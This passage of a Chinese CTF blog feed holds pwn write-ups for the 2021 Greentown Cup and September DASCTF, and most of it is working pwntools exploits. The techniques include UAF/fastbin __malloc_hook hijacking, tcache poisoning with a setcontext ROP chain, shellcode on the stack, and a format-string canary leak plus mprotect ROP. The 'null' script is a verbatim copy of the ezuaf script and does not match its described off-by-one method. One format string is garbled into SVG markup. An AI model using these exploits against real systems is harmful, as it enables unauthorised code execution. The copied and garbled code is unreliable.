class="hljs-built_in">chr</span>(j)))<br>            p.close()<br>            <span class="hljs-keyword">break</span><br>        <span class="hljs-keyword">except</span>:           <br>            p.close()<br></code></pre></td></tr></table></figure>

]]></content>
      <tags>
        <tag>PWN</tag>
      </tags>
  </entry>
  <entry>
    <title>2021绿城杯</title>
    <url>/2021/10/01/2021-10-01-2021%E7%BB%BF%E5%9F%8E%E6%9D%AFPWN/</url>
    <content><![CDATA[<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>这次PWN题对我这种pwn👶可算是友好至极阿，感受一下大佬在比赛中的杀穿的快感！不过还是不要被这些假象迷了眼，其实还是个蹒跚学步的pwn👶，继续加油！</p>
<p><img src="/2021/10/01/2021-10-01-2021%E7%BB%BF%E5%9F%8E%E6%9D%AFPWN/image-20211001115859860.png"><span class="image-caption">image-20211001115859860</span></p>
<h2 id="ezuaf"><a href="#ezuaf" class="headerlink" title="ezuaf"></a>ezuaf</h2><p><img src="/2021/10/01/2021-10-01-2021%E7%BB%BF%E5%9F%8E%E6%9D%AFPWN/image-20210929173017054.png"><span class="image-caption">image-20210929173017054</span></p>
<p>如题名字，存在UAF，借着UAF泄露libc地址，然后直接修改释放fastchunk的fd指针指向malloc_hook，劫持为one_gadget即可</p>
<figure class="highlight python"><table><tr><td class="code"><pre><code class="hljs python"><span class="hljs-comment">#!usr/bin/env python </span><br><span class="hljs-comment">#coding=utf-8</span><br><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><span class="hljs-comment">#context(arch = &#x27;amd64&#x27;,os = &#x27;linux&#x27;,log_level = &#x27;debug&#x27;)</span><br>elf = ELF(<span class="hljs-string">&quot;./uaf_pwn&quot;</span>)<br>libc = ELF(<span class="hljs-string">&quot;/home/shoucheng/glibc-all-in-one/libs/2.23-0ubuntu11.3_amd64/libc-2.23.so&quot;</span>)<br>ld = ELF(<span class="hljs-string">&quot;/home/shoucheng/glibc-all-in-one/libs/2.23-0ubuntu11.3_amd64/ld-2.23.so&quot;</span>)<br>p = process(argv=[ld.path,elf.path],env=&#123;<span class="hljs-string">&quot;LD_PRELOAD&quot;</span> : libc.path&#125;)<br>p = remote(<span class="hljs-string">&quot;82.157.5.28&quot;</span>,<span class="hljs-number">51602</span>)<br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">debug</span>():</span><br>	gdb.attach(p,<span class="hljs-string">&quot;b main&quot;</span>)<br><br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">add</span>(<span class="hljs-params">size</span>):</span><br>	p.sendlineafter(<span class="hljs-string">&quot;&gt;&quot;</span>,<span class="hljs-string">&#x27;1&#x27;</span>)<br>	p.recvuntil(<span class="hljs-string">&quot;size&gt;&quot;</span>)<br>	p.sendline(<span class="hljs-built_in">str</span>(size))<br>	<br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">edit</span>(<span class="hljs-params">idx,content</span>):</span><br>	p.sendlineafter(<span class="hljs-string">&quot;&gt;&quot;</span>,<span class="hljs-string">&#x27;3&#x27;</span>)<br>	p.recvuntil(<span class="hljs-string">&quot;index&gt;&quot;</span>)<br>	p.sendline(<span class="hljs-built_in">str</span>(idx))<br>	p.recvuntil(<span class="hljs-string">&quot;content&gt;&quot;</span>)<br>	p.send(content)<br><br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">show</span>(<span class="hljs-params">idx</span>):</span><br>	p.sendlineafter(<span class="hljs-string">&quot;&gt;&quot;</span>,<span class="hljs-string">&#x27;4&#x27;</span>)<br>	p.recvuntil(<span class="hljs-string">&quot;index&gt;&quot;</span>)<br>	p.sendline(<span class="hljs-built_in">str</span>(idx))<br><br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">free</span>(<span class="hljs-params">idx</span>):</span><br>	p.sendlineafter(<span class="hljs-string">&quot;&gt;&quot;</span>,<span class="hljs-string">&#x27;2&#x27;</span>)<br>	p.recvuntil(<span class="hljs-string">&quot;index&gt;&quot;</span>)<br>	p.sendline(<span class="hljs-built_in">str</span>(idx))<br><br><span class="hljs-string">&#x27;&#x27;&#x27;</span><br><span class="hljs-string">0x45226 execve(&quot;/bin/sh&quot;, rsp+0x30, environ)</span><br><span class="hljs-string">constraints:</span><br><span class="hljs-string">  rax == NULL</span><br><span class="hljs-string"></span><br><span class="hljs-string">0x4527a execve(&quot;/bin/sh&quot;, rsp+0x30, environ)</span><br><span class="hljs-string">constraints:</span><br><span class="hljs-string">  [rsp+0x30] == NULL</span><br><span class="hljs-string"></span><br><span class="hljs-string">0xf03a4 execve(&quot;/bin/sh&quot;, rsp+0x50, environ)</span><br><span class="hljs-string">constraints:</span><br><span class="hljs-string">  [rsp+0x50] == NULL</span><br><span class="hljs-string"></span><br><span class="hljs-string">0xf1247 execve(&quot;/bin/sh&quot;, rsp+0x70, environ)</span><br><span class="hljs-string">constraints:</span><br><span class="hljs-string">  [rsp+0x70] == NULL</span><br><span class="hljs-string">&#x27;&#x27;&#x27;</span><br><br>p.recvuntil(<span class="hljs-string">&quot;0x&quot;</span>)<br>target = <span class="hljs-built_in">int</span>(p.recv(<span class="hljs-number">12</span>),<span class="hljs-number">16</span>)<br>log.info(<span class="hljs-string">&quot;target==&gt;0x%x&quot;</span> %target)<br>add(<span class="hljs-number">0x80</span>)<br>add(<span class="hljs-number">0x60</span>)<br>free(<span class="hljs-number">0</span>)<br>show(<span class="hljs-number">0</span>)<br>libc_base = u64(p.recv(<span class="hljs-number">6</span>).ljust(<span class="hljs-number">8</span>, <span class="hljs-string">&#x27;\x00&#x27;</span>)) - <span class="hljs-number">0x3c4b78</span><br>log.info(<span class="hljs-string">&quot;libc_base==&gt;0x%x&quot;</span> %libc_base)<br>mlh = libc_base + libc.sym[<span class="hljs-string">&#x27;__malloc_hook&#x27;</span>]<br>ogg = libc_base + <span class="hljs-number">0x4527a</span><br>add(<span class="hljs-number">0x60</span>)<br>free(<span class="hljs-number">1</span>)<br>free(<span class="hljs-number">2</span>)<br>edit(<span class="hljs-number">2</span>, p64(mlh - <span class="hljs-number">0x23</span>))<br>add(<span class="hljs-number">0x60</span>)<br>add(<span class="hljs-number">0x60</span>)<br>edit(<span class="hljs-number">4</span>, p8(<span class="hljs-number">0</span>)*<span class="hljs-number">3</span> + p64(<span class="hljs-number">0</span>)*<span class="hljs-number">2</span> +p64(ogg))<br><span class="hljs-comment">#debug()</span><br>add(<span class="hljs-number">0x20</span>)<br><br>p.interactive()<br></code></pre></td></tr></table></figure>



<h2 id="null"><a href="#null" class="headerlink" title="null"></a>null</h2><p><img src="/2021/10/01/2021-10-01-2021%E7%BB%BF%E5%9F%8E%E6%9D%AFPWN/image-20210929173224666.png"><span class="image-caption">image-20210929173224666</span></p>
<p>在申请功能里面的输入点存在很明显的offbyone，通过offbyone制造overlap，可以泄露出libc，然后修改被重叠的fastchunk的fd指针指向malloc_hook，劫持为one_gadget即可</p>
<figure class="highlight python"><table><tr><td class="code"><pre><code class="hljs python"><span class="hljs-comment">#!usr/bin/env python </span><br><span class="hljs-comment">#coding=utf-8</span><br><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><span class="hljs-comment">#context(arch = &#x27;amd64&#x27;,os = &#x27;linux&#x27;,log_level = &#x27;debug&#x27;)</span><br>elf = ELF(<span class="hljs-string">&quot;./uaf_pwn&quot;</span>)<br>libc = ELF(<span class="hljs-string">&quot;/home/shoucheng/glibc-all-in-one/libs/2.23-0ubuntu11.3_amd64/libc-2.23.so&quot;</span>)<br>ld = ELF(<span class="hljs-string">&quot;/home/shoucheng/glibc-all-in-one/libs/2.23-0ubuntu11.3_amd64/ld-2.23.so&quot;</span>)<br>p = process(argv=[ld.path,elf.path],env=&#123;<span class="hljs-string">&quot;LD_PRELOAD&quot;</span> : libc.path&#125;)<br>p = remote(<span class="hljs-string">&quot;82.157.5.28&quot;</span>,<span class="hljs-number">51602</span>)<br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">debug</span>():</span><br>	gdb.attach(p,<span class="hljs-string">&quot;b main&quot;</span>)<br><br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">add</span>(<span class="hljs-params">size</span>):</span><br>	p.sendlineafter(<span class="hljs-string">&quot;&gt;&quot;</span>,<span class="hljs-string">&#x27;1&#x27;</span>)<br>	p.recvuntil(<span class="hljs-string">&quot;size&gt;&quot;</span>)<br>	p.sendline(<span class="hljs-built_in">str</span>(size))<br>	<br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">edit</span>(<span class="hljs-params">idx,content</span>):</span><br>	p.sendlineafter(<span class="hljs-string">&quot;&gt;&quot;</span>,<span class="hljs-string">&#x27;3&#x27;</span>)<br>	p.recvuntil(<span class="hljs-string">&quot;index&gt;&quot;</span>)<br>	p.sendline(<span class="hljs-built_in">str</span>(idx))<br>	p.recvuntil(<span class="hljs-string">&quot;content&gt;&quot;</span>)<br>	p.send(content)<br><br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">show</span>(<span class="hljs-params">idx</span>):</span><br>	p.sendlineafter(<span class="hljs-string">&quot;&gt;&quot;</span>,<span class="hljs-string">&#x27;4&#x27;</span>)<br>	p.recvuntil(<span class="hljs-string">&quot;index&gt;&quot;</span>)<br>	p.sendline(<span class="hljs-built_in">str</span>(idx))<br><br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">free</span>(<span class="hljs-params">idx</span>):</span><br>	p.sendlineafter(<span class="hljs-string">&quot;&gt;&quot;</span>,<span class="hljs-string">&#x27;2&#x27;</span>)<br>	p.recvuntil(<span class="hljs-string">&quot;index&gt;&quot;</span>)<br>	p.sendline(<span class="hljs-built_in">str</span>(idx))<br><br><span class="hljs-string">&#x27;&#x27;&#x27;</span><br><span class="hljs-string">0x45226 execve(&quot;/bin/sh&quot;, rsp+0x30, environ)</span><br><span class="hljs-string">constraints:</span><br><span class="hljs-string">  rax == NULL</span><br><span class="hljs-string"></span><br><span class="hljs-string">0x4527a execve(&quot;/bin/sh&quot;, rsp+0x30, environ)</span><br><span class="hljs-string">constraints:</span><br><span class="hljs-string">  [rsp+0x30] == NULL</span><br><span class="hljs-string"></span><br><span class="hljs-string">0xf03a4 execve(&quot;/bin/sh&quot;, rsp+0x50, environ)</span><br><span class="hljs-string">constraints:</span><br><span class="hljs-string">  [rsp+0x50] == NULL</span><br><span class="hljs-string"></span><br><span class="hljs-string">0xf1247 execve(&quot;/bin/sh&quot;, rsp+0x70, environ)</span><br><span class="hljs-string">constraints:</span><br><span class="hljs-string">  [rsp+0x70] == NULL</span><br><span class="hljs-string">&#x27;&#x27;&#x27;</span><br><br>p.recvuntil(<span class="hljs-string">&quot;0x&quot;</span>)<br>target = <span class="hljs-built_in">int</span>(p.recv(<span class="hljs-number">12</span>),<span class="hljs-number">16</span>)<br>log.info(<span class="hljs-string">&quot;target==&gt;0x%x&quot;</span> %target)<br>add(<span class="hljs-number">0x80</span>)<br>add(<span class="hljs-number">0x60</span>)<br>free(<span class="hljs-number">0</span>)<br>show(<span class="hljs-number">0</span>)<br>libc_base = u64(p.recv(<span class="hljs-number">6</span>).ljust(<span class="hljs-number">8</span>, <span class="hljs-string">&#x27;\x00&#x27;</span>)) - <span class="hljs-number">0x3c4b78</span><br>log.info(<span class="hljs-string">&quot;libc_base==&gt;0x%x&quot;</span> %libc_base)<br>mlh = libc_base + libc.sym[<span class="hljs-string">&#x27;__malloc_hook&#x27;</span>]<br>ogg = libc_base + <span class="hljs-number">0x4527a</span><br>add(<span class="hljs-number">0x60</span>)<br>free(<span class="hljs-number">1</span>)<br>free(<span class="hljs-number">2</span>)<br>edit(<span class="hljs-number">2</span>, p64(mlh - <span class="hljs-number">0x23</span>))<br>add(<span class="hljs-number">0x60</span>)<br>add(<span class="hljs-number">0x60</span>)<br>edit(<span class="hljs-number">4</span>, p8(<span class="hljs-number">0</span>)*<span class="hljs-number">3</span> + p64(<span class="hljs-number">0</span>)*<span class="hljs-number">2</span> +p64(ogg))<br><span class="hljs-comment">#debug()</span><br>add(<span class="hljs-number">0x20</span>)<br><br>p.interactive()<br></code></pre></td></tr></table></figure>



<h2 id="GreentownNote"><a href="#GreentownNote" class="headerlink" title="GreentownNote"></a>GreentownNote</h2><p><img src="/2021/10/01/2021-10-01-2021%E7%BB%BF%E5%9F%8E%E6%9D%AFPWN/image-20210929172949043.png"><span class="image-caption">image-20210929172949043</span></p>
<p>程序存在UAF，借着UAF把堆块劫持到tcache上，获得libc，同时修改tcache结构，获得任意地址写</p>
<p>因为开了沙箱，所以堆上布置rop链进行orw</p>
<p>最后释放堆块触发setcontext去执行到rop</p>
<p>嘿嘿，经过一段时间的学习，总算掌握了这种在堆上布置rop链的手法了，该去学习新的知识了！</p>
<figure class="highlight python"><table><tr><td class="code"><pre><code class="hljs python"><span class="hljs-comment">#!usr/bin/env python </span><br><span class="hljs-comment">#coding=utf-8</span><br><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br>context(arch = <span class="hljs-string">&#x27;amd64&#x27;</span>,os = <span class="hljs-string">&#x27;linux&#x27;</span>)<br>elf = ELF(<span class="hljs-string">&quot;./GreentownNote&quot;</span>)<br>libc = ELF(<span class="hljs-string">&quot;/home/shoucheng/glibc-all-in-one/libs/2.27-3ubuntu1_amd64/libc-2.27.so&quot;</span>)<br>ld = ELF(<span class="hljs-string">&quot;/home/shoucheng/glibc-all-in-one/libs/2.27-3ubuntu1_amd64/ld-2.27.so&quot;</span>)<br>p = process(argv=[ld.path,elf.path],env=&#123;<span class="hljs-string">&quot;LD_PRELOAD&quot;</span> : libc.path&#125;)<br>p = remote(<span class="hljs-string">&quot;82.157.5.28&quot;</span>, <span class="hljs-number">52301</span>)<br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">debug</span>():</span><br>	gdb.attach(p,<span class="hljs-string">&quot;b main&quot;</span>)<br><br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">add</span>(<span class="hljs-params">size,content</span>):</span><br>	p.sendlineafter(<span class="hljs-string">&quot;&gt; Your choice :&quot;</span>,<span class="hljs-string">&#x27;1&#x27;</span>)<br>	p.recvuntil(<span class="hljs-string">&quot;&gt; Note size :&quot;</span>)<br>	p.sendline(<span class="hljs-built_in">str</span>(size))<br>	p.recvuntil(<span class="hljs-string">&quot;&gt; Content :&quot;</span>)<br>	p.send(content)<br>	<br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">show</span>(<span class="hljs-params">idx</span>):</span><br>	p.sendlineafter(<span class="hljs-string">&quot;&gt; Your choice :&quot;</span>,<span class="hljs-string">&#x27;2&#x27;</span>)<br>	p.recvuntil(<span class="hljs-string">&quot;| Index :&quot;</span>)<br>	p.sendline(<span class="hljs-built_in">str</span>(idx))<br>	p.recvuntil(<span class="hljs-string">&quot;| Content: &quot;</span>)<br><br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">free</span>(<span class="hljs-params">idx</span>):</span><br>	p.sendlineafter(<span class="hljs-string">&quot;&gt; Your choice :&quot;</span>,<span class="hljs-string">&#x27;3&#x27;</span>)<br>	p.recvuntil(<span class="hljs-string">&quot;| Index :&quot;</span>)<br>	p.sendline(<span class="hljs-built_in">str</span>(idx))<br><br>add(<span class="hljs-number">0xf8</span>,<span class="hljs-string">&#x27;a&#x27;</span>)<br>free(<span class="hljs-number">0</span>)<br>free(<span class="hljs-number">0</span>)<br>show(<span class="hljs-number">0</span>)<br>heap_base = u64(p.recv(<span class="hljs-number">6</span>).ljust(<span class="hljs-number">8</span>,<span class="hljs-string">&#x27;\x00&#x27;</span>)) - <span class="hljs-number">0x260</span><br>log.info(<span class="hljs-string">&quot;heap_base==&gt;0x%x&quot;</span> %heap_base)<br>add(<span class="hljs-number">0xf8</span>,p64(heap_base + <span class="hljs-number">0x10</span>))<br>add(<span class="hljs-number">0xf8</span>,<span class="hljs-string">&#x27;./flag\x00&#x27;</span>)<br>add(<span class="hljs-number">0xf8</span>,p64(<span class="hljs-number">0x0707070707070707</span>)*<span class="hljs-number">8</span>)<br>free(<span class="hljs-number">2</span>)<br>show(<span class="hljs-number">2</span>)<br><br>libc_base = u64(p.recv(<span class="hljs-number">6</span>).ljust(<span class="hljs-number">8</span>,<span class="hljs-string">&#x27;\x00&#x27;</span>)) - <span class="hljs-number">0x3ebca0</span><br>log.info(<span class="hljs-string">&quot;libc_base==&gt;0x%x&quot;</span> %libc_base) <br>setcontext = libc_base + libc.sym[<span class="hljs-string">&#x27;setcontext&#x27;</span>] + <span class="hljs-number">53</span><br>free_hook = libc_base + libc.sym[<span class="hljs-string">&#x27;__free_hook&#x27;</span>]<br>syscall = <span class="hljs-built_in">next</span>(libc.search(asm(<span class="hljs-string">&quot;syscall\nret&quot;</span>))) + libc_base<br>pop_rdi = <span class="hljs-built_in">next</span>(libc.search(asm(<span class="hljs-string">&#x27;pop rdi\nret&#x27;</span>))) + libc_base<br>pop_rsi = <span class="hljs-built_in">next</span>(libc.search(asm(<span class="hljs-string">&#x27;pop rsi\nret&#x27;</span>))) + libc_base<br>pop_rdx = <span class="hljs-built_in">next</span>(libc.search(asm(<span class="hljs-string">&#x27;pop rdx\nret&#x27;</span>))) + libc_base<br>pop_rax = <span class="hljs-built_in">next</span>(libc.search(asm(<span class="hljs-string">&#x27;pop rax\nret&#x27;</span>))) + libc_base<br>ret = <span class="hljs-number">0x00000000000008aa</span> + libc_base<br>read = libc.sym[<span class="hljs-string">&#x27;read&#x27;</span>] + libc_base <br>write = libc.sym[<span class="hljs-string">&#x27;write&#x27;</span>] + libc_base<br>flag_addr = heap_base + <span class="hljs-number">0x260</span><br>rop = p64(pop_rdi) + p64(flag_addr) + p64(pop_rsi) + p64(<span class="hljs-number">0</span>) + p64(pop_rax) + p64(<span class="hljs-number">2</span>) + p64(syscall)<br>rop += p64(pop_rdi) + p64(<span class="hljs-number">3</span>) + p64(pop_rsi) + p64(flag_addr) + p64(pop_rdx)+ p64(<span class="hljs-number">0x50</span>) + p64(read)<br>rop += p64(pop_rdi) + p64(<span class="hljs-number">1</span>) + p64(pop_rsi) + p64(flag_addr) + p64(pop_rdx)+ p64(<span class="hljs-number">0x50</span>) + p64(write)<br><br>add(<span class="hljs-number">0xf8</span>,p64(<span class="hljs-number">0</span>)*<span class="hljs-number">17</span> + p64(free_hook) + p64(heap_base + <span class="hljs-number">0x1000</span>) + p64(heap_base + <span class="hljs-number">0x10c0</span>))<br>add(<span class="hljs-number">0xa0</span>,p64(setcontext))<br>add(<span class="hljs-number">0xb8</span>,p64(<span class="hljs-number">0</span>)*<span class="hljs-number">20</span> + p64(heap_base + <span class="hljs-number">0x10c0</span>) + p64(ret)) <br>add(<span class="hljs-number">0xc8</span>,rop)<br>free(<span class="hljs-number">4</span>)<br>p.interactive()<br></code></pre></td></tr></table></figure>

]]></content>
      <tags>
        <tag>PWN</tag>
      </tags>
  </entry>
  <entry>
    <title>2021九月DASCTF</title>
    <url>/2021/09/28/2021-09-28-2021%E4%B9%9D%E6%9C%88DASCTF/</url>
    <content><![CDATA[<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>这个比赛其实是没抱着很认真的态度去打的，可能由于一贯的印象，下意识觉得安恒月赛，不是我这种小菜鸡能看的，毕竟从去年年尾学到现在，这种比赛我都是来凑人头的。但是这次，可惜了，后面看了下师傅的wp，发现，竟然不难，所以出篇博客复现一下吧，这是到目前为止，唯一全部pwn题都是我能做的了，也许，这就是进步了吧，岁月漫长，值得期待！</p>
<p>来源：<a href="http://rencvn.top/2021/09/26/PWN32/">http://rencvn.top/2021/09/26/PWN32/</a></p>
<p><a href="https://www.cnblogs.com/LynneHuan/p/15335597.html">https://www.cnblogs.com/LynneHuan/p/15335597.html</a></p>
<h2 id="hehepwn"><a href="#hehepwn" class="headerlink" title="hehepwn"></a>hehepwn</h2><p><img src="/2021/09/28/2021-09-28-2021%E4%B9%9D%E6%9C%88DASCTF/image-20210928152753508.png"><span class="image-caption">image-20210928152753508</span></p>
<p>常规checksec，64位保护全没开，第一想法就是执行shellcode</p>
<p><img src="/2021/09/28/2021-09-28-2021%E4%B9%9D%E6%9C%88DASCTF/image-20210928152907622.png"><span class="image-caption">image-20210928152907622</span></p>
<p><img src="/2021/09/28/2021-09-28-2021%E4%B9%9D%E6%9C%88DASCTF/image-20210928152921816.png"><span class="image-caption">image-20210928152921816</span></p>
<p><img src="/2021/09/28/2021-09-28-2021%E4%B9%9D%E6%9C%88DASCTF/image-20210928152851336-16328141798011.png"><span class="image-caption">image-20210928152851336</span></p>
<p>首先，会有个输入点，并且还会打印我们输入的内容，只要我们输入满0x20个字符，就会连着rbp一起泄露出来，获取到栈上地址，后面还贴心的给了栈溢出。</p>
<p>那就明确了：栈上写入shellcode，借用得到来的栈上地址算出shellcode写入的地址，将这个地址填充到返回地址去，然后执行shellcode</p>
<p><img src="/2021/09/28/2021-09-28-2021%E4%B9%9D%E6%9C%88DASCTF/image-20210928153222539.png"><span class="image-caption">image-20210928153222539</span></p>
<figure class="highlight python"><table><tr><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br>context(arch = <span class="hljs-string">&#x27;amd64&#x27;</span>, os = <span class="hljs-string">&#x27;linux&#x27;</span>, log_level = <span class="hljs-string">&#x27;debug&#x27;</span>)<br><span class="hljs-comment">#p = process(&quot;./bypwn&quot;)</span><br>p = remote(<span class="hljs-string">&quot;node4.buuoj.cn&quot;</span>,<span class="hljs-number">29608</span>)<br>p.recvuntil(<span class="hljs-string">&quot;well you input:\n&quot;</span>)<br>p.send(<span class="hljs-string">&#x27;a&#x27;</span>*<span class="hljs-number">0x20</span>)<br>p.recvuntil(<span class="hljs-string">&#x27;a&#x27;</span>*<span class="hljs-number">0x20</span>)<br><span class="hljs-comment">#gdb.attach(p,&quot;b *main&quot;)</span><br>stack_addr = u64(p.recv(<span class="hljs-number">6</span>).ljust(<span class="hljs-number">8</span>, <span class="hljs-string">&#x27;\x00&#x27;</span>))<br>log.info(<span class="hljs-string">&quot;stack_addr==&gt;0x%x&quot;</span> %stack_addr)<br>p.recvuntil(<span class="hljs-string">&quot;EASY PWN PWN PWN~\n&quot;</span>)<br>shellcode = asm(shellcraft.sh())<br><span class="hljs-built_in">print</span>(<span class="hljs-built_in">hex</span>(<span class="hljs-built_in">len</span>(shellcode)))<br>payload = shellcode.ljust(<span class="hljs-number">88</span>, <span class="hljs-string">&#x27;a&#x27;</span>) + p64(stack_addr - <span class="hljs-number">80</span>)<br>p.sendline(payload)<br>p.interactive()<br></code></pre></td></tr></table></figure>



<h2 id="hahapwn"><a href="#hahapwn" class="headerlink" title="hahapwn"></a>hahapwn</h2><p><img src="/2021/09/28/2021-09-28-2021%E4%B9%9D%E6%9C%88DASCTF/image-20210928145300688.png"><span class="image-caption">image-20210928145300688</span></p>
<p>常规checksec，64位，没开PIE，RELRO也没开全</p>
<p><img src="/2021/09/28/2021-09-28-2021%E4%B9%9D%E6%9C%88DASCTF/image-20210928145345926.png"><span class="image-caption">image-20210928145345926</span></p>
<p><img src="/2021/09/28/2021-09-28-2021%E4%B9%9D%E6%9C%88DASCTF/image-20210928145402864.png"><span class="image-caption">image-20210928145402864</span></p>
<p>程序也十分简单，但是开了沙箱，所以是orw。给了格式化字符串，用来泄露canary的，以及一个明显栈溢出。</p>
<p>所以思路很明确的，也很简单，就是通过格式化字符串泄露出canary，其实由于长度够，还能再多泄露一个寄存器或者栈上存储的函数地址，从而获取libc地址，然后呢，这边泄露的选择寄存器上的没问题，刚开始我是选择栈上的stdin，然后发现远程这个打印出来是空的</p>
<p><img src="/2021/09/28/2021-09-28-2021%E4%B9%9D%E6%9C%88DASCTF/image-20210928152412946.png"><span class="image-caption">image-20210928152412946</span></p>
<p><img src="/2021/09/28/2021-09-28-2021%E4%B9%9D%E6%9C%88DASCTF/image-20210928152432248.png"><span class="image-caption">image-20210928152432248</span></p>
<p>换成寄存器上的libc地址就行了。拥有了libc和canary后就可以着手布置rop了，我的做法是使用mprotect修改权限然后跳转到read函数进行写入shellcode，最后跳转shellcode执行读取flag。师傅的做法就是直接用rop进行open，read，write的调用读取flag</p>
<p><img src="/2021/09/28/2021-09-28-2021%E4%B9%9D%E6%9C%88DASCTF/image-20210928152051899.png"><span class="image-caption">image-20210928152051899</span></p>
<p>这题有点坑，看了师傅的wp也知道了，环境有点问题，官方给的附件里的libc版本是跟远程靶机差了一个小版本的，把libc换成2.23-0ubuntu11.3即可</p>
<figure class="highlight python"><table><tr><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br>elf = ELF(<span class="hljs-string">&#x27;./pwn&#x27;</span>)<br>main = elf.sym[<span class="hljs-string">&#x27;main&#x27;</span>]<br>libc = ELF(<span class="hljs-string">&quot;/home/shoucheng/glibc-all-in-one/libs/2.23-0ubuntu11.3_amd64/libc-2.23.so&quot;</span>)<br><span class="hljs-comment">#libc = ELF(&#x27;libc.so.6&#x27;)</span><br>ld = ELF(<span class="hljs-string">&quot;/home/shoucheng/glibc-all-in-one/libs/2.23-0ubuntu11.3_amd64/ld-2.23.so&quot;</span>)<br>p = process(argv=[ld.path,elf.path],env=&#123;<span class="hljs-string">&quot;LD_PRELOAD&quot;</span> : libc.path&#125;)<br>p = remote(<span class="hljs-string">&quot;node4.buuoj.cn&quot;</span>,<span class="hljs-number">27901</span>)<br><span class="hljs-comment">#gdb.attach(p,&quot;b *main&quot;)</span><br>context(arch = <span class="hljs-string">&#x27;amd64&#x27;</span>,os = <span class="hljs-string">&#x27;linux&#x27;</span>,log_level = <span class="hljs-string">&#x27;debug&#x27;</span>)<br><br>p.recvuntil(<span class="hljs-string">&quot;Welcome! What is your name?\n&quot;</span>)<br>p.sendline(<span class="hljs-string">&quot;%3<svg xmlns:xlink="http://www.w3.org/1999/xlink" width="1.259ex" height="2.009ex" style="vertical-align: -0.671ex; margin-left: -0.089ex;" viewbox="-38.5 -576.1 542 865.1" role="img" focusable="false" xmlns="http://www.w3.org/2000/svg" aria-labelledby="MathJax-SVG-1-Title">
<title id="MathJax-SVG-1-Title">p%27</title>
<defs aria-hidden="true">
<path stroke-width="1" id="E1-MJMATHI-70" d="M23 287Q24 290 25 295T30 317T40 348T55 381T75 411T101 433T134 442Q209 442 230 378L240 387Q302 442 358 442Q423 442 460 395T497 281Q497 173 421 82T249 -10Q227 -10 210 -4Q199 1 187 11T168 28L161 36Q160 35 139 -51T118 -138Q118 -144 126 -145T163 -148H188Q194 -155 194 -157T191 -175Q188 -187 185 -190T172 -194Q170 -194 161 -194T127 -193T65 -192Q-5 -192 -24 -194H-32Q-39 -187 -39 -183Q-37 -156 -26 -148H-6Q28 -147 33 -136Q36 -130 94 103T155 350Q156 355 156 364Q156 405 131 405Q109 405 94 377T71 316T59 280Q57 278 43 278H29Q23 284 23 287ZM178 102Q200 26 252 26Q282 26 310 49T356 107Q374 141 392 215T411 325V331Q411 405 350 405Q339 405 328 402T306 393T286 380T269 365T254 350T243 336T235 326L232 322Q232 321 229 308T218 264T204 212Q178 106 178 102Z"/>
</defs>
<g stroke="currentColor" fill="currentColor" stroke-width="0" transform="matrix(1 0 0 -1 0 0)" aria-hidden="true">
 <use xlink:href="#E1-MJMATHI-70" x="0" y="0"/>
</g>
</svg>p&quot;</span>)<br>p.recvuntil(<span class="hljs-string">&#x27;0x&#x27;</span>)<br>libc_base = <span class="hljs-built_in">int</span>(p.recv(<span class="hljs-number">12</span>),<span class="hljs-number">16</span>) - <span class="hljs-number">0xf73c0</span><br>log.info(<span class="hljs-string">&quot;libc_base==&gt;0x%x&quot;</span> %libc_base)<br>p.recvuntil(<span class="hljs-string">&quot;0x&quot;</span>)<br>canary = <span class="hljs-built_in">int</span>(p.recv(<span class="hljs-number">16</span>),<span class="hljs-number">16</span>)<br>log.info(<span class="hljs-string">&quot;canary==&gt;0x%x&quot;</span> %canary)<br>p.recvuntil(<span class="hljs-string">&quot;What can we help you?\n&quot;</span>)<br>mprotect = libc.sym[<span class="hljs-string">&#x27;mprotect&#x27;</span>] + libc_base <br>pop_rdi = libc_base + <span class="hljs-number">0x0000000000021112</span><br>pop_rsi = libc_base + <span class="hljs-number">0x00000000000202f8</span><br>pop_rdx = libc_base + <span class="hljs-number">0x0000000000001b92</span><br>read = libc_base + libc.sym[<span class="hljs-string">&#x27;read&#x27;</span>]<br>bss = <span class="hljs-number">0x601000</span><br><br>payload = <span class="hljs-string">&#x27;a&#x27;</span>*<span class="hljs-number">0x68</span> + p64(canary) + <span class="hljs-string">&#x27;a&#x27;</span>*<span class="hljs-number">0x8</span> + p64(pop_rdi) + p64(bss) <br>payload += p64(pop_rsi) + p64(<span class="hljs-number">0x1000</span>) + p64(pop_rdx) + p64(<span class="hljs-number">7</span>) + p64(mprotect)<br>payload += p64(pop_rdi) + p64(<span class="hljs-number">0</span>) + p64(pop_rsi) + p64(bss + <span class="hljs-number">0x80</span>) + p64(pop_rdx) + p64(<span class="hljs-number">0x100</span>) + p64(read)<br>payload += p64(bss + <span class="hljs-number">0x80</span>)<br>shellcode = asm(<br>	<span class="hljs-string">&#x27;&#x27;&#x27;</span><br><span class="hljs-string">    mov rsi, 0x67616c662f2e</span><br><span class="hljs-string">    push rsi</span><br><span class="hljs-string">    mov rdi, rsp</span><br><span class="hljs-string">    mov rax, 2</span><br><span class="hljs-string">    xor rsi, rsi</span><br><span class="hljs-string">    syscall</span><br><span class="hljs-string"></span><br><span class="hljs-string">    mov rdi, rax</span><br><span class="hljs-string">    xor rax, 